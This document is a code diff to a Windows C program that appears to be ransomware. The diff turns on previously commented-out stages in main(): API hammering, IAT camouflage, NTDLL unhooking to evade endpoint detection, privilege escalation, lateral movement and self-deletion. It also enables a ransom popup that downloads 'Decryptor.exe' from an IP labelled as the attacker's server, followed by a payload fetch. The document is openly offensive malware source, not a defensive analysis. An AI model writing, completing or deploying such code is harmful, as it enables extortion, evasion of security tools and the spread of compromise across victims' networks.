@@ -238,7 +238,7 @@ void ShowDownloadPopup() {
 	if (msgboxID == IDOK) {
 		HRESULT hr = URLDownloadToFile(
 			NULL,
-			L"http://192.168.206.8/Decryptor.exe", // Change as per attacker server ip
+			L"http://192.168.29.245/Decryptor.exe", // Change as per attacker server ip
 			L"decryptor.exe",
 			0,
 			NULL
@@ -268,48 +268,46 @@ void ShowDownloadPopup() {
 
 int main() {
 
-	//DWORD dwThreadId = NULL;
+	DWORD dwThreadId = NULL;
 
-	//// Create a thread to run the API hammering function in the background
-	//if (!CreateThread(NULL, NULL, ApiHammering, -1, NULL, &dwThreadId)) {
-	//	printf("[!] CreateThread Failed With Error : %d \n", GetLastError());
-	//	return -1;
-	//}
-	//printf("[+] Thread %d Was Created To Run ApiHammering In The Background\n", dwThreadId);
+	// Create a thread to run the API hammering function in the background
+	if (!CreateThread(NULL, NULL, ApiHammering, -1, NULL, &dwThreadId)) {
+		printf("[!] CreateThread Failed With Error : %d \n", GetLastError());
+		return -1;
+	}
+	printf("[+] Thread %d Was Created To Run ApiHammering In The Background\n\n", dwThreadId);
 
-	////Initiate IAT camouflage
-	//IatCamouflage();
-	//printf("[+] IAT Camouflage Done \n");
+	//Initiate IAT camouflage
+	IatCamouflage();
+	printf("[+] IAT Camouflage Done \n\n");
 
-	//// Unhook NTDLL for EDR Evasion
-	//if (!UnhookNtDLL()) {
-	//	printf("[!] Failed To Unhook NTDLL \n");
-	//}
+	// Unhook NTDLL for EDR Evasion
+	if (!UnhookNtDLL()) {
+		printf("[!] Failed To Unhook NTDLL \n\n");
+	}
 
-	//// Escalate the current process privileges
-	//if (!DoPrivilegeEscalation()) {
-	//	printf("[!] Failed To Escalate Privileges \n");
-	//}
+	// Escalate the current process privileges
+	if (!DoPrivilegeEscalation()) {
+		printf("[!] Failed To Escalate Privileges \n\n");
+	}
 
 	// Perform Lateral Movement
 	if (!DoLateralMovement()) {
-		printf("[!] Failed To Perform Lateral Movement \n");
+		printf("[!] Failed To Perform Lateral Movement \n\n");
 	}
 
 	//Delete the binary
 	if (!DeleteSelf()) {
-		printf("[!] Failed To Delete Self Binary \n");
+		printf("[!] Failed To Delete Self Binary \n\n");
 	}
 	
-	//// Ask the user to pay up
-	//ShowDownloadPopup();
+	// Ask the user to pay up
+	ShowDownloadPopup();
 
-	////Fetching payload
-	//if (!fetchPayload()) {
-	//	printf("[!] Failed To Fetch Payload \n");
-	//}
-
-	getchar();
+	//Fetching payload
+	if (!fetchPayload()) {
+		printf("[!] Failed To Fetch Payload \n\n");
+	}
 
 	return 0;
 }
